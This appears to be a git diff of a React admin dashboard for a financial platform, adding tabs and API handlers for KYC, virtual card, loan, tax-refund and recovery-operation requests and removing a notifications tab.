@@ -29,7 +29,11 @@ import {
   Upload,
   ExternalLink,
   X,
-  AlertCircle
+  AlertCircle,
+  Briefcase,
+  FileText,
+  Globe,
+  ArrowLeftRight
 } from 'lucide-react';
 import { useAuth } from '@/contexts/AuthContext';
 import { showSuccess, showError } from '@/utils/toast';
@@ -39,6 +43,9 @@ import WithdrawalScheduleManager from '@/components/admin/WithdrawalScheduleMana
 
 import SupportMessagesManager from '@/components/admin/SupportMessagesManager';
 import NewsletterManager from '@/components/admin/NewsletterManager';
+import TestimonialManager from '@/components/admin/TestimonialManager';
+import CardTopUpManager from '@/components/admin/CardTopUpManager';
+import RecoveryCaseManager from '@/components/admin/RecoveryCaseManager';
 // Note: UserService is server-side only, we'll use API calls instead
 
 interface PaymentMethod {
@@ -135,7 +142,7 @@ interface WithdrawalRequest {
 
 const AdminSection = () => {
   const { user, userProfile } = useAuth();
-  const [activeTab, setActiveTab] = useState<'users' | 'plans' | 'payments' | 'transactions' | 'notifications' | 'support' | 'withdrawal-schedule' | 'newsletter'>('users');
+  const [activeTab, setActiveTab] = useState<'users' | 'kyc-requests' | 'card-requests' | 'card-topups' | 'loan-requests' | 'tax-refunds' | 'payments' | 'transactions' | 'support' | 'withdrawal-schedule' | 'recovery-ops' | 'newsletter' | 'testimonials'>('users');
   const [users, setUsers] = useState<AdminUser[]>([]);
   const [plans, setPlans] = useState<InvestmentPlan[]>([]);
   const [paymentMethods, setPaymentMethods] = useState<PaymentMethod[]>([]);
@@ -144,6 +151,23 @@ const AdminSection = () => {
   const [loadingUsers, setLoadingUsers] = useState(false);
   const [loadingPlans, setLoadingPlans] = useState(false);
   const [loadingPayments, setLoadingPayments] = useState(false);
+  const [kycRequests, setKycRequests] = useState<AdminUser[]>([]);
+  const [loadingKyc, setLoadingKyc] = useState(false);
+  const [cardRequests, setCardRequests] = useState<any[]>([]);
+  const [loadingCards, setLoadingCards] = useState(false);
+  const [showCardModal, setShowCardModal] = useState(false);
+  const [selectedCard, setSelectedCard] = useState<any>(null);
+  const [cardRejectionReason, setCardRejectionReason] = useState('');
+  const [loanRequests, setLoanRequests] = useState<any[]>([]);
+  const [loadingLoans, setLoadingLoans] = useState(false);
+  const [showLoanModal, setShowLoanModal] = useState(false);
+  const [selectedLoan, setSelectedLoan] = useState<any>(null);
+  const [loanRejectionReason, setLoanRejectionReason] = useState('');
+  const [taxRefundRequests, setTaxRefundRequests] = useState<any[]>([]);
+  const [loadingTaxRefunds, setLoadingTaxRefunds] = useState(false);
+  const [showTaxRefundModal, setShowTaxRefundModal] = useState(false);
+  const [selectedTaxRefund, setSelectedTaxRefund] = useState<any>(null);
+  const [taxRefundRejectionReason, setTaxRefundRejectionReason] = useState('');
   const [isOffline, setIsOffline] = useState(false);
   const [searchTerm, setSearchTerm] = useState('');
   const [userStatusFilter, setUserStatusFilter] = useState<'all' | 'active' | 'inactive'>('all');
@@ -152,15 +176,6 @@ const AdminSection = () => {
   const [investmentFilter, setInvestmentFilter] = useState<'all' | 'hasActive' | 'none'>('all');
   const [transactionSearchTerm, setTransactionSearchTerm] = useState('');
 
-  // Notification states
-  const [showNotificationModal, setShowNotificationModal] = useState(false);
-  const [notificationType, setNotificationType] = useState<'broadcast' | 'individual'>('broadcast');
-  const [notificationMessage, setNotificationMessage] = useState('');
-  const [notificationTitle, setNotificationTitle] = useState('');
-  const [notificationDetails, setNotificationDetails] = useState('');
-  const [notificationFiles, setNotificationFiles] = useState<File[]>([]);
-  const [selectedUsersForNotification, setSelectedUsersForNotification] = useState<string[]>([]);
-  const [sendingNotification, setSendingNotification] = useState(false);
 
   // User detail states
   const [showUserDetailModal, setShowUserDetailModal] = useState(false);
@@ -189,12 +204,27 @@ const AdminSection = () => {
   const [depositFilter, setDepositFilter] = useState<'all' | 'pending' | 'approved' | 'rejected'>('all');
   const [withdrawalFilter, setWithdrawalFilter] = useState<'all' | 'pending' | 'processing' | 'completed' | 'rejected'>('all');
   const [isLoadingTransactions, setIsLoadingTransactions] = useState(false);
+  const [showKycModal, setShowKycModal] = useState(false);
+  const [selectedKycUser, setSelectedKycUser] = useState<AdminUser | null>(null);
+  const [kycRejectionReason, setKycRejectionReason] = useState('');
   const [isSendingMessage, setIsSendingMessage] = useState(false);
   const [confirmAction, setConfirmAction] = useState<{
     type: 'deletePlan' | 'deleteUser' | 'deletePayment';
     id: string;
     name: string;
   } | null>(null);
+
+  // Notification states
+  const [showNotificationModal, setShowNotificationModal] = useState(false);
+  const [notificationType, setNotificationType] = useState<'individual' | 'broadcast'>('individual');
+  const [notificationTitle, setNotificationTitle] = useState('');
+  const [notificationMessage, setNotificationMessage] = useState('');
+  const [notificationDetails, setNotificationDetails] = useState('');
+  const [notificationFiles, setNotificationFiles] = useState<File[]>([]);
+  const [selectedUsersForNotification, setSelectedUsersForNotification] = useState<string[]>([]);
+  const [sendingNotification, setSendingNotification] = useState(false);
+  const [notificationPreview, setNotificationPreview] = useState<string | null>(null);
+  const [showNotificationHistory, setShowNotificationHistory] = useState(false);
 
   // MongoDB services
   const planService = useMemo(() => new PlanService(), []);
@@ -223,6 +253,18 @@ const AdminSection = () => {
       window.removeEventListener('offline', handleOffline);
     };
   }, []);
+
+  useEffect(() => {
+    if (activeTab === 'kyc-requests') {
+      loadKycRequests();
+    } else if (activeTab === 'card-requests') {
+      loadCardRequests();
+    } else if (activeTab === 'loan-requests') {
+      loadLoanRequests();
+    } else if (activeTab === 'tax-refunds') {
+      loadTaxRefundRequests();
+    }
+  }, [activeTab]);
 
   const loadUsers = useCallback(async () => {
     setLoadingUsers(true);
@@ -428,6 +470,146 @@ const AdminSection = () => {
     } catch (error) {
       console.error('Error updating transaction:', error);
       showError('An error occurred while updating the transaction');
+    }
+  };
+
+  const loadKycRequests = async () => {
+    setLoadingKyc(true);
+    try {
+      const response = await fetch('/api/admin/kyc');
+      const result = await response.json();
+      if (result.success) {
+        setKycRequests(result.data);
+      } else {
+        showError(result.error || 'Failed to load KYC requests');
+      }
+    } catch (error) {
+      console.error('Error loading KYC requests:', error);
+      showError('Failed to load KYC requests');
+    } finally {
+      setLoadingKyc(false);
+    }
+  };
+
+  const loadCardRequests = async () => {
+    setLoadingCards(true);
+    try {
+      const response = await fetch('/api/admin/cards?status=pending');
+      const result = await response.json();
+      if (result.success) {
+        setCardRequests(result.data);
+      } else {
+        showError(result.error || 'Failed to load card requests');
+      }
+    } catch (error) {
+      console.error('Error loading card requests:', error);
+      showError('Failed to load card requests');
+    } finally {
+      setLoadingCards(false);
+    }
+  };
+
+  const loadLoanRequests = useCallback(async () => {
+    setLoadingLoans(true);
+    try {
+      const response = await fetch('/api/admin/loans');
+      const result = await response.json();
+      if (result.success) setLoanRequests(result.data);
+    } catch (error) {
+      console.error('Error loading loans:', error);
+    } finally {
+      setLoadingLoans(false);
+    }
+  }, []);
+
+  const loadTaxRefundRequests = useCallback(async () => {
+    setLoadingTaxRefunds(true);
+    try {
+      const response = await fetch('/api/admin/tax-refunds');
+      const result = await response.json();
+      if (result.success) setTaxRefundRequests(result.data);
+    } catch (error) {
+      console.error('Error loading tax refunds:', error);
+    } finally {
+      setLoadingTaxRefunds(false);
+    }
+  }, []);
+
+  const updateLoanStatus = async (id: string, status: string, reason?: string) => {
+    try {
+      const response = await fetch('/api/admin/loans', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id, status, rejectionReason: reason })
+      });
+      const result = await response.json();
+      if (result.success) {
+        showSuccess(`Loan application ${status} successfully.`);
+        loadLoanRequests();
+      } else {
+        showError(result.error || 'Failed to update loan status');
+      }
+    } catch (error) {
+      showError('An error occurred.');
+    }
+  };
+
+  const updateTaxRefundStatus = async (id: string, status: string, reason?: string) => {
+    try {
+      const response = await fetch('/api/admin/tax-refunds', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id, status, rejectionReason: reason })
+      });
+      const result = await response.json();
+      if (result.success) {
+        showSuccess(`Tax refund request ${status} successfully.`);
+        loadTaxRefundRequests();
+      } else {
+        showError(result.error || 'Failed to update request status');
+      }
+    } catch (error) {
+      showError('An error occurred.');
+    }
+  };
+
+  const updateCardStatus = async (cardId: string, action: 'approve' | 'decline', reason?: string) => {
+    try {
+      const response = await fetch('/api/admin/cards', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cardId, action, reason })
+      });
+      const result = await response.json();
+      if (result.success) {
+        showSuccess(`Card request ${action}d successfully`);
+        loadCardRequests();
+      } else {
+        showError(result.error || `Failed to ${action} card request`);
+      }
+    } catch (error) {
+      console.error(`Error ${action}ing card request:`, error);
+      showError(`Failed to ${action} card request`);
+    }
+  };
+
+  const updateKycRequestStatus = async (userId: string, action: 'approve' | 'decline', reason?: string) => {
+    try {
+      const response = await fetch('/api/admin/kyc', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, action, reason })
+      });
+      const result = await response.json();
+      if (result.success) {
+        showSuccess(`KYC request ${action}d successfully`);
+        loadKycRequests();
+      } else {
+        showError(result.error || `Failed to ${action} KYC request`);
+      }
+    } catch (error) {
+      console.error(`Error ${action}ing KYC request:`, error);
+      showError(`Failed to ${action} KYC request`);
     }
   };
 
@@ -928,12 +1110,17 @@ const AdminSection = () => {
         <div className="flex flex-wrap gap-3 mb-10">
           {[
             { id: 'users', label: 'Users', icon: <Users className="w-5 h-5" /> },
-            { id: 'plans', label: 'Investment Plans', icon: <TrendingUp className="w-5 h-5" /> },
+            { id: 'kyc-requests', label: 'KYC Requests', icon: <UserCheck className="w-5 h-5" /> },
+            { id: 'card-requests', label: 'Card Requests', icon: <CreditCard className="w-5 h-5" /> },
+            { id: 'loan-requests', label: 'Loan Requests', icon: <Briefcase className="w-5 h-5" /> },
+            { id: 'tax-refunds', label: 'Tax Refunds', icon: <FileText className="w-5 h-5" /> },
             { id: 'payments', label: 'Payment Methods', icon: <CreditCard className="w-5 h-5" /> },
             { id: 'transactions', label: 'Transactions', icon: <DollarSign className="w-5 h-5" /> },
-            { id: 'notifications', label: 'Notifications', icon: <Bell className="w-5 h-5" /> },
+            { id: 'card-topups', label: 'Card Top-ups', icon: <ArrowLeftRight className="w-5 h-5" /> },
+            { id: 'testimonials', label: 'Testimonials', icon: <MessageSquare className="w-5 h-5" /> },
             { id: 'newsletter', label: 'Newsletter', icon: <Mail className="w-5 h-5" /> },
             { id: 'support', label: 'Support Messages', icon: <MessageSquare className="w-5 h-5" /> },
+            { id: 'recovery-ops', label: 'Recovery Operations', icon: <FileSearch className="w-5 h-5" /> },
             { id: 'withdrawal-schedule', label: 'Withdrawal Schedule', icon: <Clock className="w-5 h-5" /> }
           ].map(tab => (
             <button
@@ -951,6 +1138,233 @@ const AdminSection = () => {
             </button>
           ))}
         </div>
+
+        {/* Card Requests Tab */}
+        {activeTab === 'card-requests' && (
+          <div className="space-y-6">
+            <div className="flex items-center justify-between mb-8 pb-6 border-b border-gray-100">
+              <div>
+                <h3 className="text-xl font-black text-navy-900 uppercase tracking-tighter">Virtual Card Bureau</h3>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Pending Issuance Requests</p>
+              </div>
+              <button 
+                onClick={loadCardRequests}
+                className="p-3 bg-gray-50 text-gray-400 hover:text-navy-900 rounded-xl transition-all"
+                title="Refresh Records"
+              >
+                <RefreshCw className={`w-5 h-5 ${loadingCards ? 'animate-spin' : ''}`} />
+              </button>
+            </div>
+
+            {loadingCards ? (
+              <div className="flex flex-col items-center justify-center py-20 bg-gray-50/50 rounded-[2.5rem] border border-dashed border-gray-200">
+                <div className="w-12 h-12 border-4 border-gold-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Querying issuance ledger...</p>
+              </div>
+            ) : cardRequests.length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                {cardRequests.map((request: any) => (
+                  <div key={request._id} className="bg-white p-6 rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl hover:shadow-navy-900/5 transition-all duration-500 group">
+                    <div className="flex items-center justify-between mb-6">
+                      <div className="flex items-center gap-4">
+                        <div className="w-12 h-12 bg-navy-900 rounded-2xl flex items-center justify-center text-gold-500 font-black shadow-lg shadow-navy-900/10">
+                          {request.user?.firstName?.charAt(0)}{request.user?.lastName?.charAt(0)}
+                        </div>
+                        <div>
+                          <p className="text-[11px] font-black uppercase tracking-tight text-navy-900 truncate max-w-[120px]">
+                            {request.user?.firstName} {request.user?.lastName}
+                          </p>
+                          <p className="text-[9px] font-black text-gold-600 uppercase tracking-widest">{request.user?.userCode}</p>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1">Fee Paid</p>
+                        <p className="text-sm font-black text-navy-900">${request.fee}</p>
+                      </div>
+                    </div>
+
+                    <div className="bg-gray-50 p-5 rounded-3xl border border-gray-100 mb-6">
+                      <div className="flex justify-between items-center mb-3">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Type</span>
+                        <span className="text-[10px] font-black text-navy-900 uppercase tracking-widest">{request.cardType}</span>
+                      </div>
+                      <div className="flex justify-between items-center mb-3">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Level</span>
+                        <span className="px-3 py-1 bg-gold-500 text-navy-900 rounded-lg text-[8px] font-black uppercase tracking-widest">{request.cardLevel}</span>
+                      </div>
+                      <div className="flex justify-between items-center">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Limit</span>
+                        <span className="text-[10px] font-black text-navy-900 uppercase tracking-widest">${request.spendLimit?.toLocaleString()}</span>
+                      </div>
+                    </div>
+
+                    <div className="flex gap-3">
+                      <button
+                        onClick={() => {
+                          setSelectedCard(request);
+                          setShowCardModal(true);
+                        }}
+                        className="flex-1 bg-navy-900 hover:bg-navy-800 text-gold-500 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest transition-all shadow-lg shadow-navy-900/10 active:scale-95"
+                      >
+                        Audit Request
+                      </button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-20 bg-gray-50/50 rounded-[2.5rem] border border-dashed border-gray-200">
+                <CreditCard className="w-16 h-16 text-gray-200 mx-auto mb-4" />
+                <h4 className="text-sm font-black text-navy-900 uppercase tracking-widest">No Card Requests</h4>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Issuance ledger is currently synchronized</p>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* Loan Requests Tab */}
+        {activeTab === 'loan-requests' && (
+          <div className="space-y-6">
+            <div className="flex items-center justify-between mb-8 pb-6 border-b border-gray-100">
+              <div>
+                <h3 className="text-xl font-black text-navy-900 uppercase tracking-tighter">Loan Underwriting Bureau</h3>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Pending Credit Applications</p>
+              </div>
+              <button 
+                onClick={loadLoanRequests}
+                className="p-3 bg-gray-50 text-gray-400 hover:text-navy-900 rounded-xl transition-all"
+              >
+                <RefreshCw className={`w-5 h-5 ${loadingLoans ? 'animate-spin' : ''}`} />
+              </button>
+            </div>
+
+            {loadingLoans ? (
+              <div className="flex flex-col items-center justify-center py-20 bg-gray-50/50 rounded-[2.5rem] border border-dashed border-gray-200">
+                <div className="w-12 h-12 border-4 border-gold-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Checking credit ledger...</p>
+              </div>
+            ) : loanRequests.length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                {loanRequests.map((loan) => (
+                  <div key={loan._id} className="bg-white p-6 rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl transition-all group">
+                    <div className="flex items-center justify-between mb-6">
+                      <div className="flex items-center gap-4">
+                        <div className="w-12 h-12 bg-navy-900 rounded-2xl flex items-center justify-center text-gold-500 font-black">
+                          {loan.userDetails?.firstName?.[0]}{loan.userDetails?.lastName?.[0]}
+                        </div>
+                        <div>
+                          <p className="text-[11px] font-black uppercase text-navy-900">{loan.userDetails?.firstName} {loan.userDetails?.lastName}</p>
+                          <p className="text-[9px] font-black text-gold-600 uppercase tracking-widest">{loan.userDetails?.userCode}</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div className="bg-gray-50 p-5 rounded-3xl border border-gray-100 mb-6">
+                      <div className="flex justify-between items-center mb-3">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Amount</span>
+                        <span className="text-[10px] font-black text-navy-900">${loan.amount?.toLocaleString()}</span>
+                      </div>
+                      <div className="flex justify-between items-center mb-3">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Facility</span>
+                        <span className="text-[10px] font-black text-navy-900 uppercase tracking-widest">{loan.facility}</span>
+                      </div>
+                      <div className="flex justify-between items-center">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Status</span>
+                        <span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest ${
+                          loan.status === 'pending' ? 'bg-gold-50 text-gold-600 border border-gold-100' :
+                          loan.status === 'approved' ? 'bg-green-50 text-green-500 border border-green-100' :
+                          'bg-red-50 text-red-500 border border-red-100'
+                        }`}>
+                          {loan.status}
+                        </span>
+                      </div>
+                    </div>
+                    <button 
+                      onClick={() => { setSelectedLoan(loan); setShowLoanModal(true); }}
+                      className="w-full bg-navy-900 text-gold-500 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest active:scale-95 transition-all"
+                    >
+                      Audit App
+                    </button>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-20 bg-gray-50/50 rounded-[2.5rem] border border-dashed border-gray-200">
+                <Briefcase className="w-16 h-16 text-gray-200 mx-auto mb-4" />
+                <h4 className="text-sm font-black text-navy-900 uppercase tracking-widest">No Loan Requests</h4>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* Tax Refunds Tab */}
+        {activeTab === 'tax-refunds' && (
+          <div className="space-y-6">
+            <div className="flex items-center justify-between mb-8 pb-6 border-b border-gray-100">
+              <div>
+                <h3 className="text-xl font-black text-navy-900 uppercase tracking-tighter">Tax Refund Portal</h3>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">IRS Rebate Applications</p>
+              </div>
+              <button 
+                onClick={loadTaxRefundRequests}
+                className="p-3 bg-gray-50 text-gray-400 hover:text-navy-900 rounded-xl transition-all"
+              >
+                <RefreshCw className={`w-5 h-5 ${loadingTaxRefunds ? 'animate-spin' : ''}`} />
+              </button>
+            </div>
+
+            {loadingTaxRefunds ? (
+              <div className="flex flex-col items-center justify-center py-20 bg-gray-50/50 rounded-[2.5rem] border border-dashed border-gray-200">
+                <div className="w-12 h-12 border-4 border-gold-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Auditing tax records...</p>
+              </div>
+            ) : taxRefundRequests.length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                {taxRefundRequests.map((req: any) => (
+                  <div key={req._id} className="bg-white p-6 rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl transition-all group">
+                    <div className="flex items-center justify-between mb-6">
+                      <div className="flex items-center gap-4">
+                        <div className="w-12 h-12 bg-navy-900 rounded-2xl flex items-center justify-center text-gold-500 font-black">
+                          {req.fullName?.[0]}
+                        </div>
+                        <div>
+                          <p className="text-[11px] font-black uppercase text-navy-900">{req.fullName}</p>
+                          <p className="text-[9px] font-black text-gold-600 uppercase tracking-widest">{req.country}</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div className="bg-gray-50 p-5 rounded-3xl border border-gray-100 mb-6">
+                      <div className="flex justify-between items-center mb-3">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">ID Type</span>
+                        <span className="text-[10px] font-black text-navy-900 uppercase tracking-widest">SSN/Tax ID</span>
+                      </div>
+                      <div className="flex justify-between items-center">
+                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Status</span>
+                        <span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest ${
+                          req.status === 'pending' ? 'bg-gold-50 text-gold-600 border border-gold-100' :
+                          req.status === 'processing' ? 'bg-blue-50 text-blue-500 border border-blue-100' :
+                          'bg-green-50 text-green-500 border border-green-100'
+                        }`}>
+                          {req.status}
+                        </span>
+                      </div>
+                    </div>
+                    <button 
+                      onClick={() => { setSelectedTaxRefund(req); setShowTaxRefundModal(true); }}
+                      className="w-full bg-navy-900 text-gold-500 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest active:scale-95 transition-all"
+                    >
+                      Audit Identity
+                    </button>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-20 bg-gray-50/50 rounded-[2.5rem] border border-dashed border-gray-200">
+                <FileText className="w-16 h-16 text-gray-200 mx-auto mb-4" />
+                <h4 className="text-sm font-black text-navy-900 uppercase tracking-widest">No Rebate Requests</h4>
+              </div>
+            )}
+          </div>
+        )}
 
         {/* Users Tab */}
         {activeTab === 'users' && (
@@ -970,7 +1384,8 @@ const AdminSection = () => {
                     placeholder="Search users..."
                     value={searchTerm}
                     onChange={(e) => setSearchTerm(e.target.value)}
-                    className="w-full pl-12 pr-5 py-4 bg-white border border-gray-200 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 text-sm shadow-sm"
+                    className="w-full pl-12 pr-5 py-4 bg-white border border-gray-200 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900"
+                    placeholder="Search users..."
                   />
                 </div>
                 {/* Filters */}
@@ -1111,71 +1526,13 @@ const AdminSection = () => {
           </div>
         )}
 
-        {/* Notifications Tab */}
-        {activeTab === 'notifications' && (
-          <div className="space-y-10">
-            <div className="flex justify-between items-center">
-              <h3 className="text-2xl font-black text-navy-900 uppercase tracking-tighter">Communications Center</h3>
-            </div>
 
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
-              {/* Broadcast Notification */}
-              <div className="bg-white rounded-3xl p-8 border border-gray-100 shadow-sm group hover:shadow-xl transition-all duration-300">
-                <div className="flex items-center space-x-4 mb-6">
-                  <div className="p-3 bg-gold-50 text-gold-500 rounded-2xl group-hover:bg-navy-900 group-hover:text-gold-500 transition-colors">
-                    <Bell className="w-6 h-6" />
-                  </div>
-                  <h4 className="text-lg font-black text-navy-900 uppercase tracking-tight">Broadcast Message</h4>
-                </div>
-                <p className="text-gray-400 text-sm leading-relaxed mb-8">Send an urgent announcement or platform update to every registered user on the platform.</p>
-                <button
-                  onClick={() => {
-                    setNotificationType('broadcast');
-                    setShowNotificationModal(true);
-                  }}
-                  className="w-full bg-navy-900 hover:bg-navy-800 text-gold-500 px-6 py-4 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all shadow-xl shadow-navy-900/10 active:scale-95"
-                >
-                  Blast to All Users
-                </button>
-              </div>
-
-              {/* Individual Notification */}
-              <div className="bg-white rounded-3xl p-8 border border-gray-100 shadow-sm group hover:shadow-xl transition-all duration-300">
-                <div className="flex items-center space-x-4 mb-6">
-                  <div className="p-3 bg-gold-50 text-gold-500 rounded-2xl group-hover:bg-navy-900 group-hover:text-gold-500 transition-colors">
-                    <Mail className="w-6 h-6" />
-                  </div>
-                  <h4 className="text-lg font-black text-navy-900 uppercase tracking-tight">Targeted Message</h4>
-                </div>
-                <p className="text-gray-400 text-sm leading-relaxed mb-8">Send personalized messages or specific account alerts to selected users or groups.</p>
-                <button
-                  onClick={() => {
-                    setNotificationType('individual');
-                    setShowNotificationModal(true);
-                  }}
-                  className="w-full bg-gold-50 hover:bg-[#c9933a] text-[#0b1626] px-6 py-4 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all shadow-xl shadow-gold-500/10 active:scale-95 border border-gold-400/20"
-                >
-                  Contact Select Users
-                </button>
-              </div>
-            </div>
-
-            {/* Recent Notifications */}
-            <div className="mt-8">
-              <h4 className="text-lg font-semibold text-gray-900 mb-4">Recent Notifications</h4>
-              <div className="bg-white rounded-lg border border-gray-200 p-4">
-                <p className="text-gray-500 text-center">No notifications sent yet</p>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* Investment Plans Tab */}
-        {activeTab === 'plans' && (
+        {/* KYC Requests Tab */}
+        {activeTab === 'kyc-requests' && (
           <div className="space-y-8">
             <div className="flex flex-wrap items-center justify-between gap-6">
               <div className="flex items-center space-x-4">
-                <h3 className="text-2xl font-black text-navy-900 uppercase tracking-tighter">Strategic Assets</h3>
+                <h3 className="text-2xl font-black text-navy-900 uppercase tracking-tighter">Identity Verification Queue</h3>
                 {isOffline && (
                   <div className="flex items-center space-x-2 bg-red-50 text-red-500 font-bold px-4 py-2 rounded-2xl border border-red-100">
                     <div className="w-2 h-2 bg-red-500 rounded-full animate-ping"></div>
@@ -1184,86 +1541,68 @@ const AdminSection = () => {
                 )}
               </div>
               <button
-                onClick={() => {
-                  setEditingPlan(null);
-                  setShowPlanModal(true);
-                }}
-                className="bg-navy-900 hover:bg-navy-800 text-gold-500 px-6 py-4 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all shadow-xl shadow-navy-900/10 flex items-center gap-3 active:scale-95"
+                onClick={loadKycRequests}
+                disabled={loadingKyc}
+                className="bg-navy-900 hover:bg-navy-800 disabled:bg-navy-900/50 text-gold-500 px-6 py-4 rounded-2xl font-black uppercase tracking-widest text-[10px] transition-all shadow-xl shadow-navy-900/10 flex items-center gap-3 active:scale-95"
               >
-                <Plus className="w-4 h-4" />
-                <span>Deploy New Asset</span>
+                {loadingKyc ? (
+                  <div className="w-4 h-4 border-2 border-gold-500 border-t-transparent rounded-full animate-spin"></div>
+                ) : (
+                  <RefreshCw className="w-4 h-4" />
+                )}
+                <span>Refresh Queue</span>
               </button>
             </div>
 
-            {loadingPlans ? (
+            {loadingKyc ? (
               <div className="flex justify-center items-center py-20">
                 <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-[#c9933a]"></div>
               </div>
+            ) : kycRequests.length === 0 ? (
+              <div className="bg-white rounded-3xl p-12 border border-gray-100 text-center shadow-sm">
+                <div className="w-20 h-20 bg-gray-50 rounded-full flex items-center justify-center mx-auto mb-6">
+                  <UserCheck className="w-10 h-10 text-gray-200" />
+                </div>
+                <h4 className="text-xl font-black text-navy-900 uppercase tracking-tight mb-2">Queue is Clear</h4>
+                <p className="text-gray-400 max-w-md mx-auto">There are no pending identity verification requests at this time.</p>
+              </div>
             ) : (
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
-                {plans.map(plan => (
-                  <div key={plan._id || `plan-${Math.random()}`} className="bg-white rounded-3xl p-8 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 group">
+                {kycRequests.map(user => (
+                  <div key={user._id} className="bg-white rounded-3xl p-8 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 group">
                     <div className="flex items-center justify-between mb-8">
-                      <div className="flex items-center space-x-3">
-                        <div className="p-3 bg-gray-50 rounded-2xl group-hover:bg-gold-50 transition-colors">
-                          <TrendingUp className="w-6 h-6 text-gray-300 group-hover:text-gold-500" />
+                      <div className="flex items-center space-x-4">
+                        <div className="w-12 h-12 bg-navy-50 rounded-2xl flex items-center justify-center font-black text-navy-900 uppercase tracking-tighter">
+                          {user.firstName?.charAt(0)}{user.lastName?.charAt(0)}
                         </div>
-                        <h4 className="font-black text-navy-900 uppercase tracking-tight">{plan.name}</h4>
-                      </div>
-                      <div className="flex items-center space-x-2 opacity-0 group-hover:opacity-100 transition-opacity">
-                        <button
-                          onClick={() => {
-                            setEditingPlan(plan);
-                            setNewPlan(plan);
-                            setShowPlanModal(true);
-                          }}
-                          className="p-2.5 bg-gray-50 text-gray-400 hover:bg-gold-50 hover:text-gold-500 rounded-xl transition-all"
-                        >
-                          <Edit className="w-4 h-4" />
-                        </button>
-                        <button
-                          onClick={() => handleDeletePlan(plan._id || '', plan.name)}
-                          className="p-2.5 bg-gray-50 text-gray-400 hover:bg-red-50 hover:text-red-500 rounded-xl transition-all"
-                        >
-                          <Trash2 className="w-4 h-4" />
-                        </button>
+                        <div>
+                          <h4 className="font-black text-navy-900 uppercase tracking-tight">{user.firstName} {user.lastName}</h4>
+                          <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{user.userCode}</p>
+                        </div>
                       </div>
                     </div>
 
-                    <div className="space-y-4 mb-8">
-                      <div className="flex justify-between items-baseline">
-                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Entry Limit</span>
-                        <div className="flex flex-col items-end">
-                          <span className="text-sm font-black text-navy-900">${plan.minAmount.toLocaleString()}</span>
-                          <span className="text-[9px] font-bold text-gray-300 -mt-0.5">MINIMUM</span>
-                        </div>
+                    <div className="space-y-4 mb-8 bg-gray-50/50 p-6 rounded-2xl border border-gray-100/50">
+                      <div className="flex justify-between items-center py-1">
+                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Email</span>
+                        <span className="text-xs font-bold text-navy-900 truncate max-w-[150px]">{user.email}</span>
                       </div>
-                      <div className="flex justify-between items-baseline">
-                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Yield ROI</span>
-                        <span className="text-sm font-black text-gold-600">+{plan.roi}%</span>
-                      </div>
